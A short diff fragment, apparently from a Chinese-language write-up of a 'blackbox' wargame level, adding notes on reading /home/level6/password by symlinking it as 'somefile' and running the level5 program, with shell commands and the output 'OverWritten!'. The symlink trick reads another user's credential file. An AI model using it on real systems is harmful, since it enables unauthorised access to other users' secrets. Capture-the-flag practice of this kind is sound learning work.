@@ -36,3 +36,10 @@ int main(int argc, char **argv)
         fclose(fh);
 }
 level5@blackbox:~$ 
+
+读取一个文件，想到通过给/home/level6/password创建一个符号链接：somefile
+然后让程序读取这个符号链接，从而读取内容
+level5@blackbox:/tmp/level5$ ln -s /home/level6/password somefile 
+level5@blackbox:/tmp/level5$ /home/level5/list 
+OverWritten!
+level5@blackbox:/tmp/level5$ 
